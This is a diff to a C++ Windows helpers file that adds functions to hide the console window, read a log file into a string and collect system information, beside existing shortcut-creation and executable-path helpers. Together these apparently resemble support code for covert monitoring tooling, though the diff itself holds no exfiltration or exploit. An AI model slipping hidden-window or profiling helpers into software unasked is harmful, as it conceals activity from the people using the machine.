@@ -3,6 +3,8 @@
 #include <Windows.h>
 #include "helpers.h"
 #include <string>
+#include <iterator>
+#include <fstream>
 
 HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc)
 
@@ -50,7 +52,33 @@ HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPC
 	return hres;
 }
 
+void HideConsole() { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }
+
+std::string stream_as_string(std::istream &stm) {
+	return {std::istreambuf_iterator<char>(stm), std::istreambuf_iterator<char>{}};
+}
+
+std::string getLog(std::string filename) {
+	std::ifstream file(filename);
+	return stream_as_string(file);
+}
+
 std::string getExePath() {
 	char result[MAX_PATH];
 	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
 }
+
+
+/***
+ * getSystemInfo | Performs calls to WindowsAPI functions to retrieve hardware and software
+ *information
+ ***/
+SYSTEM_INFO getSystemInfo(std::string data) {
+	SYSTEM_INFO siSysInfo;
+
+	// Copy the hardware information to the SYSTEM_INFO struct
+	GetSystemInfo(&siSysInfo);
+
+	return siSysInfo;
+}
+
